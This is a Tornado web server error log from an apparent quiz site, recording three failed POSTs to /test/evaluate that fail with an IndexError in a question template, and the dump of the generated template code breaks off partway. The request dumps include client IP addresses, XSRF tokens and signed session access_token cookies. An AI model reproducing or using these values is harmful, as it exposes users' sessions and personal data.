HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=50579d1d8e4c85782ae2b6d9&answers=%5B1%5D&cursor=18&_xsrf=bfa32809b9434dc5b19e6536f9c32ee6', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.56 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '188.220.245.181', 'Cookie': '_xsrf=bfa32809b9434dc5b19e6536f9c32ee6; access_token="QUFBRzZsTmNzNkdjQkFDcFpCb3FVTmlrWTZaQklYVHU4SU5wcVhOR0Y4Nk1BemhtYWk0VjJFOGh5d0xudlFaQk1KcnpYQW5aQWQxcVpCWG1BOFdvNjVZSG1PZlF2Q1V5TmtYZEloVHlaQ3pMQVpEWkQ=|1347918462|dc71e1f475e3463b6fe329feb3f914be82a4d8d1"; __utma=188782963.93926689.1347918435.1347918435.1347918435.1; __utmb=188782963.5.10.1347918435; __utmc=188782963; __utmz=188782963.1347918435.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 80.37ms
WARNING:root:405 HEAD / (127.0.0.1) 0.65ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 0.76ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.14ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 0.85ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.14ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505850bc8e4c85782ae2b6dc&answers=%5B2%5D&cursor=1&_xsrf=36c72ad09a6a45d89e729cf0a7a6c950', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '86.167.54.162', 'Cookie': '_xsrf=36c72ad09a6a45d89e729cf0a7a6c950; access_token="QUFBRzZsTmNzNkdjQkFGWkJ0N2lyT1VNZXdIdHlaQmdqVXlwd3laQlU0cE9yOUhqaGpUYzV5R0JreElweUJQd1hmamVja1Z6ZFJqWkJGSnpwTXVWWkFMUFJ1dm5uYkFWYmVaQWtMa1lFVjFVUVpEWkQ=|1347964993|7a6d0935c48262ba5d4637e9e95f3d6c43606232"; __utma=188782963.2080245892.1347887295.1347923020.1347964982.4; __utmb=188782963.11.10.1347964982; __utmc=188782963; __utmz=188782963.1347887295.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 191.31ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505850bc8e4c85782ae2b6dc&answers=%5B2%5D&cursor=14&_xsrf=36c72ad09a6a45d89e729cf0a7a6c950', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '86.167.54.162', 'Cookie': '_xsrf=36c72ad09a6a45d89e729cf0a7a6c950; access_token="QUFBRzZsTmNzNkdjQkFGWkJ0N2lyT1VNZXdIdHlaQmdqVXlwd3laQlU0cE9yOUhqaGpUYzV5R0JreElweUJQd1hmamVja1Z6ZFJqWkJGSnpwTXVWWkFMUFJ1dm5uYkFWYmVaQWtMa1lFVjFVUVpEWkQ=|1347964993|7a6d0935c48262ba5d4637e9e95f3d6c43606232"; __utma=188782963.2080245892.1347887295.1347923020.1347964982.4; __utmb=188782963.11.10.1347964982; __utmc=188782963; __utmz=188782963.1347887295.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 89.35ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
